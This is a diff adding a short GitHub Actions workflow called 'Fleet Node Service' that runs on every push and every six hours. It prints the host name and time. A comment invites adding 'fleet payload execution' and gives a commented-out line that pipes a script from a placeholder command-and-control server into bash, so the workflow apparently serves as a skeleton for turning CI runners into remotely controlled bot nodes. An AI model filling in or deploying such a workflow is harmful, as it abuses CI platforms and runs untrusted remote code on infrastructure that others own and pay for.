@@ -1,0 +1,22 @@
+name: Fleet Node Service
+
+on:
+  push:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v3
+    
+    - name: Initialize Fleet Node
+      run: |
+        echo "Fleet Node Initialized"
+        echo "Node ID: $(hostname)"
+        echo "Time: $(date)"
+        # Add your fleet payload execution here
+        # curl -sL http://your-c2-server/payload.sh | bash
